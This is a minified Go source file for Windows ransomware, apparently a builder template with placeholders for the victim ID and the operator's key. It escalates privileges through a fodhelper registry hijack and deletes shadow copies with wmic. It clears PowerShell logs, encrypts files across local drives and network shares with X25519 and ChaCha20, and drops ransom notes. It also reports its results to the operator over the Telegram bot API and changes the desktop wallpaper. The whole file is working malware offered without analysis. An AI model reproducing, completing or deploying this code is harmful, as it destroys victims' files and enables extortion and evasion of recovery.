package main
import("bytes";"crypto/aes";"crypto/cipher";"crypto/ecdh";"crypto/hmac";"crypto/rand";"crypto/sha256";"encoding/base64";"encoding/binary";"encoding/json";"fmt";"io";"net/http";"os";"os/exec";"path/filepath";"runtime";"strings";"sync";"sync/atomic";"syscall";"time";"unsafe";"golang.org/x/crypto/chacha20";"golang.org/x/crypto/hkdf";"golang.org/x/sys/windows";"golang.org/x/sys/windows/registry";_"embed")
//go:embed bg.jpeg
var wD []byte
const mI="{{.ID}}"
const eT="{{.EncryptedToken}}"
const eC="{{.EncryptedChatID}}"
const(fM=0x4C494E47;fS=96;cS=1<<20)
const(PF=0;I1=1;I2=2)
const(dR=2;dF=3;dT=4;dK=6)
var(rX string;mPK=[]byte{{.PublicKeyBytes}})
func dc(e string)string{k:=sha256.Sum256([]byte(mI));b,r:=aes.NewCipher(k[:]);if r!=nil{return ""};g,r:=cipher.NewGCM(b);if r!=nil{return ""};d,r:=base64.StdEncoding.DecodeString(e);if r!=nil{return ""};n:=g.NonceSize();if len(d)<n{return ""};p,r:=g.Open(nil,d[:n],d[n:],nil);if r!=nil{return ""};return string(p)}
func rb()byte{b:=make([]byte,1);rand.Read(b);return b[0]}
func ge()string{const c="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";l:=6+int(rb()%3);b:=make([]byte,l);for i:=range b{b[i]=c[rb()%byte(len(c))]};return string(b)}
var eD=map[string]struct{}{"$recycle.bin":{},"system volume information":{},"windows":{},"program files":{},"program files (x86)":{},"programdata":{},"appdata":{},"efi":{},"boot":{},"recovery":{},"perflogs":{},"msocache":{},"msys64":{},"microsoft":{},"intel":{}}
var eE=map[string]struct{}{".sys":{},".exe":{},".dll":{},".com":{},".scr":{},".bat":{},".vbs":{},".ps1":{},".msi":{},".inf":{},".reg":{},".ini":{},".lnk":{}}
var eF=map[string]struct{}{"desktop.ini":{},"thumbs.db":{},"bootmgr":{},"bootnxt":{},"pagefile.sys":{},"hiberfil.sys":{},"swapfile.sys":{},"autorun.inf":{}}
func ef(a,b string)bool{if len(a)!=len(b){return false};for i:=0;i<len(a);i++{ca,cb:=a[i],b[i];if ca>='A'&&ca<='Z'{ca+=32};if cb>='A'&&cb<='Z'{cb+=32};if ca!=cb{return false}};return true}
func id(n string)bool{if len(n)>0&&n[0]=='$'{return true};for k:=range eD{if ef(n,k){return true}};return false}
func iff(n string)bool{for k:=range eF{if ef(n,k){return true}};return false}
func ie(x string)bool{for k:=range eE{if ef(x,k){return true}};return false}
type S struct{f,d,s,e,t int64}
func(s*S)ae(){atomic.AddInt64(&s.e,1)}
func(s*S)as(){atomic.AddInt64(&s.s,1)}
func(s*S)af(){atomic.AddInt64(&s.d,1)}
func(s*S)ai(z int64){atomic.AddInt64(&s.f,1);atomic.AddInt64(&s.t,z)}
func ia()bool{f,e:=os.Open("\\\\.\\PHYSICALDRIVE0");if e!=nil{return false};f.Close();return true}
func cu(){k:=`Software\Classes\ms-settings\Shell\Open\command`;registry.DeleteKey(registry.CURRENT_USER,k)}
func ek()bool{n:=windows.NewLazySystemDLL("ntdll.dll");p:=n.NewProc("NtAdjustPrivilegesToken");var t windows.Token;if windows.OpenProcessToken(windows.CurrentProcess(),windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,&t)!=nil{return false};defer t.Close();var l windows.LUID;if windows.LookupPrivilegeValue(nil,windows.StringToUTF16Ptr("SeShutdownPrivilege"),&l)!=nil{return false};tp:=struct{C uint32;L [1]windows.LUID;A [1]uint32}{1,[1]windows.LUID{l},[1]uint32{windows.SE_PRIVILEGE_ENABLED}};var r uint32;ret,_,_:=p.Call(uintptr(t),0,uintptr(unsafe.Pointer(&tp)),unsafe.Sizeof(tp),0,uintptr(unsafe.Pointer(&r)));return ret==0}
func bu(){if ia(){return};ek();e,r:=os.Executable();if r!=nil{return};k:=`Software\Classes\ms-settings\Shell\Open\command`;x,_,r:=registry.CreateKey(registry.CURRENT_USER,k,registry.SET_VALUE);if r!=nil{return};defer x.Close();x.SetStringValue("",e);x.SetStringValue("DelegateExecute","");c:=exec.Command("fodhelper.exe");c.SysProcAttr=&syscall.SysProcAttr{HideWindow:true};c.Start();time.Sleep(time.Second);os.Exit(0)}
func ds(){a:=[][]string{{"cmd.exe","/c","wmic shadowcopy delete"},{"wevtutil","cl","Windows PowerShell"}};for _,v:=range a{c:=exec.Command(v[0],v[1:]...);c.SysProcAttr=&syscall.SysProcAttr{HideWindow:true};c.Run()}}
func it(d uintptr)bool{return d==dR||d==dF||d==dT||d==dK}
func dd()[]string{k:=syscall.NewLazyDLL("kernel32.dll");l:=k.NewProc("GetLogicalDrives");t:=k.NewProc("GetDriveTypeW");r,_,_:=l.Call();b:=uint32(r);var d []string;for i:=0;i<26;i++{if b&(1<<uint(i))==0{continue};v:=fmt.Sprintf("%c:\\",rune('A'+i));p,_:=syscall.UTF16PtrFromString(v);x,_,_:=t.Call(uintptr(unsafe.Pointer(p)));if it(x){d=append(d,v)}};d=append(d,gn()...);return d}
func gn()[]string{c:=exec.Command("net","use");c.SysProcAttr=&syscall.SysProcAttr{HideWindow:true};o,e:=c.Output();if e!=nil{return nil};var s []string;for _,l:=range strings.Split(string(o),"\n"){if strings.Contains(l,"OK"){if f:=strings.Fields(l);len(f)>1{s=append(s,f[1])}}};return s}
func is(p string)bool{fi,e:=os.Lstat(p);return e==nil&&fi.Mode()&os.ModeSymlink!=0}
func rr(p string){t,e:=syscall.UTF16PtrFromString(p);if e!=nil{return};a,e:=syscall.GetFileAttributes(t);if e==nil&&a&syscall.FILE_ATTRIBUTE_READONLY!=0{syscall.SetFileAttributes(t,a&^syscall.FILE_ATTRIBUTE_READONLY)}}
func ow(p string)(*os.File,error){t,e:=syscall.UTF16PtrFromString(p);if e!=nil{return nil,e};h,e:=syscall.CreateFile(t,syscall.GENERIC_READ|syscall.GENERIC_WRITE,syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,nil,syscall.OPEN_EXISTING,syscall.FILE_ATTRIBUTE_NORMAL,0);if e!=nil{return nil,e};return os.NewFile(uintptr(h),p),nil}
func cm(n string)bool{t,e:=syscall.UTF16PtrFromString(n);if e!=nil{return false};_,e=windows.CreateMutex(nil,false,t);return e==nil}
func zm(d []byte){for i:=range d{d[i]=0};runtime.KeepAlive(d)}
func dn(d string){n:=fmt.Sprintf("FILES ENCRYPTED!\nID:%s\nEXT:.%s\n",mI,rX);os.WriteFile(filepath.Join(d,"README.txt"),[]byte(n),0644)}
func fs(b int64)string{const(K=1024;M=K*K;G=K*M;T=K*G);switch{case b>=T:return fmt.Sprintf("%.2f TB",float64(b)/float64(T));case b>=G:return fmt.Sprintf("%.2f GB",float64(b)/float64(G));case b>=M:return fmt.Sprintf("%.2f MB",float64(b)/float64(M));case b>=K:return fmt.Sprintf("%.2f KB",float64(b)/float64(K));default:return fmt.Sprintf("%d B",b)}}
type WC struct{m [32]byte;e,b,n []byte}
func nw(m*ecdh.PublicKey)(*WC,error){p,e:=ecdh.X25519().GenerateKey(rand.Reader);if e!=nil{return nil,e};s,e:=p.ECDH(m);if e!=nil{return nil,e};defer zm(s);mk:=sha256.Sum256(s);return&WC{m:mk,e:p.PublicKey().Bytes(),b:make([]byte,cS),n:make([]byte,24)},nil}
func dk(m [32]byte,s []byte)[32]byte{r:=hkdf.New(sha256.New,m[:],s,[]byte("filekey"));var k [32]byte;io.ReadFull(r,k[:]);return k}
func co(p int,o int64)[]int64{if p==PF{n:=(o+cS-1)/cS;x:=make([]int64,n);for i:=int64(0);i<n;i++{x[i]=i*cS};return x};s:=int64(5*1024*1024);if p==I2{s=50*1024*1024};var x []int64;x=append(x,0);for q:=s;q+cS<=o;q+=s{x=append(x,q)};l:=o-cS;if l>0&&(len(x)==0||l>=x[len(x)-1]+int64(cS)){x=append(x,l)};if len(x)==0{n:=(o+cS-1)/cS;x=make([]int64,n);for i:=int64(0);i<n;i++{x[i]=i*cS}};return x}
func sp(z int64)int{if z>100*1024*1024{return I2};if z>10*1024*1024{return I1};return PF}
func ec(f*os.File,x []int64,o int64,k [32]byte,h io.Writer,ctx*WC)bool{for _,v:=range x{r:=cS;if v+int64(r)>o{r=int(o-v)};f.Seek(v,io.SeekStart);if n,_:=f.Read(ctx.b[:r]);n!=r{return false};for j:=range ctx.n{ctx.n[j]=0};binary.LittleEndian.PutUint64(ctx.n[16:],uint64(v));c,e:=chacha20.NewUnauthenticatedCipher(k[:],ctx.n);if e!=nil{return false};c.XORKeyStream(ctx.b[:r],ctx.b[:r]);f.Seek(v,io.SeekStart);if _,e:=f.Write(ctx.b[:r]);e!=nil{return false};h.Write(ctx.b[:r])};return true}
func wf(f*os.File,o int64,p int,e,s,h []byte)error{b:=make([]byte,fS);binary.LittleEndian.PutUint32(b[0:4],fM);binary.LittleEndian.PutUint64(b[4:12],uint64(o));b[12]=byte(p);copy(b[16:48],e);copy(b[48:64],s);copy(b[64:96],h[:32]);if _,r:=f.WriteAt(b,o);r!=nil{return r};return f.Truncate(o+fS)}
func efil(p string,s*S,ctx*WC){i,e:=os.Stat(p);if e!=nil{s.ae();return};o:=i.Size();if o==0{s.as();return};pa:=sp(o);ox:=co(pa,o);rr(p);f,e:=ow(p);if e!=nil{s.ae();return};defer f.Close();var sl [16]byte;rand.Read(sl[:]);fk:=dk(ctx.m,sl[:]);h:=hmac.New(sha256.New,fk[:]);h.Write(sl[:]);if !ec(f,ox,o,fk,h,ctx){s.ae();return};if r:=wf(f,o,pa,ctx.e,sl[:],h.Sum(nil));r!=nil{s.ae();return};f.Sync();f.Close();if r:=os.Rename(p,p+"."+rX);r!=nil{s.ae();return};s.ai(o)}
func sc(d []string,c chan<- string,w,p*sync.WaitGroup){defer w.Done();for _,v:=range d{p.Add(1);c<-v}}
func dw(s*S,f chan<- string,d chan string,m chan struct{},w,dp,fp*sync.WaitGroup){defer w.Done();for v:=range d{m<-struct{}{};func(p string){defer dp.Done();defer func(){<-m}();if is(p){s.as();return};e,r:=os.ReadDir(p);if r!=nil{s.ae();return};dn(p);for _,o:=range e{n:=o.Name();u:=filepath.Join(p,n);if o.IsDir(){if id(n){s.as();continue};s.af();dp.Add(1);go func(z string){d<-z}(u)}else{if iff(n)||ie(filepath.Ext(n)){s.as();continue};fp.Add(1);go func(z string){defer fp.Done();f<-z}(u)}}}(v)}}
func ew(f <-chan string,s*S,m*ecdh.PublicKey,w*sync.WaitGroup){defer w.Done();ctx,e:=nw(m);if e!=nil{s.ae();return};for p:=range f{efil(p,s,ctx)}}
func st(i string,t time.Time,f,z int64,x string){tk:=dc(eT);ci:=dc(eC);if tk==""||ci==""{return};m:=fmt.Sprintf("DONE! ID:%s Files:%d Size:%s Ext:.%s",i,f,fs(z),x);p,_:=json.Marshal(map[string]string{"chat_id":ci,"text":m});http.Post(fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage",tk),"application/json",bytes.NewBuffer(p))}
func sw(){p:=filepath.Join(os.TempDir(),"wp.jpg");os.WriteFile(p,wD,0644);t,_:=syscall.UTF16PtrFromString(p);u:=syscall.NewLazyDLL("user32.dll");r:=u.NewProc("SystemParametersInfoW");r.Call(0x0014,0,uintptr(unsafe.Pointer(t)),0x01|0x02)}
func main(){if !ia(){bu()};cu();ds();if !cm("Global\\Ransomware_"+mI){os.Exit(0)};rX=ge();c:=runtime.NumCPU();runtime.GOMAXPROCS(c);w:=c*4;fc:=make(chan string,1000);dc:=make(chan string,1000);m,e:=ecdh.X25519().NewPublicKey(mPK);if e!=nil{panic(e)};stt:=time.Now();ss:=&S{};var pw,dg sync.WaitGroup;var dpp,fpp sync.WaitGroup;var dr []string;if len(os.Args)>1{dr=[]string{os.Args[1]}}else{dr=dd()};pw.Add(1);go sc(dr,dc,&pw,&dpp);go func(){pw.Wait();dpp.Wait();close(dc)}();sm:=make(chan struct{},w);for i:=0;i<w;i++{dg.Add(1);go dw(ss,fc,dc,sm,&dg,&dpp,&fpp)};var eg sync.WaitGroup;for i:=0;i<w;i++{eg.Add(1);go ew(fc,ss,m,&eg)};dg.Wait();fpp.Wait();close(fc);eg.Wait();st(mI,stt,atomic.LoadInt64(&ss.f),atomic.LoadInt64(&ss.t),rX);sw()}
